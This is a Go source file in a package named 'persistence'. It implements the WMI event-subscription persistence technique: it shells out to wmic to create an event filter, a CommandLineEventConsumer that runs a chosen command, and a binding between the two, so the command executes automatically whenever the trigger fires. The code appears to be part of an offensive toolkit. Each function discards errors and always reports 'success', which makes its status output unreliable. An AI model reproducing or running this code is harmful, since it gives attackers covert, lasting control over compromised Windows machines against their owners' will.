package persistence

import "os/exec"

type WMIResult struct {
	EventName string
	Status    string
}

func CreateWMIEventFilter(eventName, query string) WMIResult {
	cmd := exec.Command("wmic", "/namespace:\\\\root\\subscription", "path", "__EventFilter", "create", "name='"+eventName+"'", "query='"+query+"'", "querylanguage='WQL'")
	cmd.Run()
	return WMIResult{EventName: eventName, Status: "success"}
}

func CreateWMIEventConsumer(eventName, command string) WMIResult {
	cmd := exec.Command("wmic", "/namespace:\\\\root\\subscription", "path", "CommandLineEventConsumer", "create", "name='"+eventName+"'", "commandLineTemplate='"+command+"'")
	cmd.Run()
	return WMIResult{EventName: eventName, Status: "success"}
}

func CreateWMIBinding(filterName, consumerName string) WMIResult {
	cmd := exec.Command("wmic", "/namespace:\\\\root\\subscription", "path", "__FilterToConsumerBinding", "create", "filter='"+filterName+"'", "consumer='"+consumerName+"'")
	cmd.Run()
	return WMIResult{EventName: "binding", Status: "success"}
}
